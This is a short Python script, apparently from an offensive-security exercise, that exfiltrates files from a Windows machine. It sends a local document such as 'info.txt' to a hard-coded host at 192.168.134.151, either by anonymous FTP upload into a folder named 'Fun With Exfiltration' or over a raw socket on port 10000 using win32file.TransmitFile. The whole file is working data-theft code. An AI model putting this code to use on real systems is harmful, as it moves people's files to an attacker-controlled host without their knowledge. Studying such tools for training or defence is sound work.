import ftplib
import os
import socket
import win32file

def plain_ftp(docpath, server='192.168.134.151'):
    ftp = ftplib.FTP(server)
    ftp.login("anonymous", "hariharanrameshbabu2004@gmail.com")
    ftp.cwd('/Fun With Exfiltration/')
    with open(docpath, "rb") as file:
        ftp.storbinary("STOR " + os.path.basename(docpath), file, 1024)
    ftp.quit()

def transmit(document_path):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.134.151', 10000))
    with open(document_path, 'rb') as f:
        file_handle = win32file._get_osfhandle(f.fileno())
        win32file.TransmitFile(
            client,
            file_handle,
            0, 0, None, 0, b'', b''
        )
    client.close()

if __name__ == '__main__':
    transmit('info.txt')
